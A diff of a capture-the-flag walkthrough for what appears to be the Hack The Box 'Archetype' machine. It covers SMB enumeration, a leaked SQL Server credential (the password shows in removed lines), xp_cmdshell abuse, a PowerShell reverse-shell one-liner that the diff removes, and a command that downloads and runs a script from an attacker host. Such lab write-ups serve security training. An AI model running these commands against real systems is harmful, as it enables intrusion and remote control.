@@ -65,11 +65,13 @@ As we can see, there are 5 open ports 135, 139, 445, 1234, 1433 and we also got 
 Do a bit research about these ports and I found that:
 - 135: MS-RPC endpoint mapper
 - 139: NetBIOS Session Service
-- 445: SMB protocol *(further reading here [NetBIOS and SMB Penetration Testing on Windows](https://www.hackingarticles.in/netbios-and-smb-penetration-testing-on-windows/))*
+- 445: SMB protocol *(further reading: [NetBIOS and SMB Penetration Testing on Windows](https://www.hackingarticles.in/netbios-and-smb-penetration-testing-on-windows/))*
 - 1234: I still have no idea what is this port used for :v *([TCP 1234 - Port Protocol Information and Warning!](https://www.auditmypc.com/tcp-port-1234.asp))*
 - 1433: MS-SQL Server
 
-Access SMB
+Basically, port 135 is used for sending messages between client-client and client-server. Port 139 is used for managing NetBIOS session. At simple approach, we focus on port 445 and 1433.
+
+Now I try listing shares available on a host with `smbclient` and found a share file called `prod.dtsConfig` in folder `backups`.
 ```bash
 $ smbclient -N -L \\\\10.10.10.27\\
 
@@ -93,8 +95,8 @@ smb: \> get prod.dtsConfig
 getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
 smb: \> exit
 ```
-
-Take a look at downloaded file
+Let's take a look at the downloaded file, it's an XML configuration file for SQL Server.
+> Read more: [DTSCONFIG File Extension](https://fileinfo.com/extension/dtsconfig)
 ```bash
 $ cat prod.dtsConfig 
 <DTSConfiguration>
@@ -102,20 +104,16 @@ $ cat prod.dtsConfig
 		<DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
 	</DTSConfigurationHeading>
 	<Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
-		<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+		<ConfiguredValue>Data Source=.;Password=***********;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
 	</Configuration>
 </DTSConfiguration>
 ```
-
-[DTSCONFIG File Extension](https://fileinfo.com/extension/dtsconfig)
-
-Get credential
-```sql_svc:M3g4c0rp123```
-
+As we see, the file contains a user credential: `sql_svc:<password>`.
+> I won't share any credential or flag to not ruin your experience :v
 ### 2. Foothold
-Access SQL Server
+With the credential we just have got from previous step, try to access to SQL Server on port 1433 with `mssqlclient.py` or any tool that you're familiar with.
 ```bash
-$ mssqlclient.py -p 1433 ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
+$ mssqlclient.py -p 1433 ARCHETYPE/sql_svc:<password>@10.10.10.27 -windows-auth
 Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation
 
 [*] Encryption required, switching to TLS
@@ -128,32 +126,32 @@ Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corpo
 [!] Press help for extra shell commands
 SQL>
 ```
+First thing to do is to check if the user has system admin privilege.
+```bash
+SQL> select is_srvrolemember ('sysadmin');
 
-Explore SQL
+-----------
+          1		==> User has system admin privilege!
+
+SQL>
+```
+So, user has system admin privilege, next thing we want to do is to enable xp_cmdshell, which allow us to execute command lines on target.
 ```bash
 SQL> enable_xp_cmdshell
 SQL> reconfigure;
 SQL> xp_cmdshell "whoami"
 archetype\sql_svc
 
-SQL> select is_srvrolemember ('sysadmin');
-
------------
-          1		==> User has system admin privilege!
-
-SQL> 
+SQL>
 ```
+For a more convenient and stable connection, we will set up a reverse shell on target machine. There are many shell script that available on the Internet, find yourself one and save it as `shell.ps1`. I took it from this site: [Shells - Windows](https://book.hacktricks.xyz/shells/shells/windows).
 
-Prepare reverse shell script
-[Shells - Windows](https://book.hacktricks.xyz/shells/shells/windows)
-Save this as shell.ps1
-```bash
-$client = New-Object System.Net.Sockets.TCPClient("<attacker_ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
-
-Get known .ps1 file
-[PS1 File Extension](https://fileinfo.com/extension/ps1)
-[Differences between commands run in .bat file and powershell.exe](https://stackoverflow.com/questions/48215483/differences-between-commands-run-in-bat-file-and-powershell-exe)
+If you've never heard of 'reverse shell', this would be helpful: [Understanding Reverse Shells](https://www.netsparker.com/blog/web-security/understanding-reverse-shells/).
+> What is .ps1 extention?
+> 
+> - [PS1 File Extension](https://fileinfo.com/extension/ps1)
+> 
+> - [Differences between commands run in .bat file and powershell.exe](https://stackoverflow.com/questions/48215483/differences-between-commands-run-in-bat-file-and-powershell-exe)
 
 Open http server for SQL Server to get the script
 ```bash
@@ -167,7 +165,7 @@ $ nc -lnvp <port>
 
 Execute reverse shell from SQL Server
 ```bash
-SQL> xp_cmdshell "powershell "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>:8080/shell.ps1')""
+SQL> xp_cmdshell "powershell "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>:8080/path_to_shell.ps1')""
 ```
 
 ### 3. Privilege Escalation
